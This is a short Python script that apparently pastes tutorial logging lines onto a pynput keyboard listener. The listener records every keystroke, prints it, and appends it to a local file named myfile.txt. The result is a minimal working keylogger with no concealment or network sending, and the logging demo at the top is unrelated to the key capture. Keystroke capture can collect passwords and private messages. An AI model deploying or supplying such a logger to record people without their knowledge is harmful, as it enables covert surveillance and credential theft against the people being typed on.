import pynput
import logging
logging.basicConfig(filename='example.log', encoding='utf-8', level=logging.DEBUG)
logging.debug('This message should go to the log file')
logging.info('So should this')
logging.warning('And this, too')
logging.error('And non-ASCII stuff, too, like Øresund and Malmö')

from pynput.keyboard import Listener
keys_list = ""
f = open("myfile.txt", "w")
f.close()
def on_press(key):
    print("pressed {0}".format(key))
    f = open("myfile.txt", "a")
    f.write("{0}".format(key))
    f.close()
def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

